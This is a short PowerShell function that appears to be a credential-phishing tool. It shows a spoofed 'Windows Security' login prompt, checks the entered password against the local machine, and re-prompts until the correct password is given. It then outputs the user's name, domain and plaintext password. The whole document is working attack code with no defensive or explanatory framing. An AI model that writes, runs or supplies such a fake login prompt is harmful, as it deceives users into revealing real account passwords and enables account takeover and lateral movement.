function MyLogin{
    $cred = $Host.ui.PromptForCredential("Windows Security", "Connecting to MEANET - Enter your credentials", "$env:userdomain\$env:username","")
    $domain = "$env:userdomain"
    $username = "$env:username"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    while($DS.ValidateCredentials("$full", "$password") -ne $True){
        $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Username or Password. Please try again", "$env:userdomain\$env:username","")
        $domain = "$env:userdomain"
        $username = "$env:username"
        $full = "$domain" + "\" + "$username"
        $password = $cred.GetNetworkCredential().password
        Add-Type -assemblyname System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
        $DS.ValidateCredentials("$full", "$password") | out-null
        }
     
     $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
     $output
}
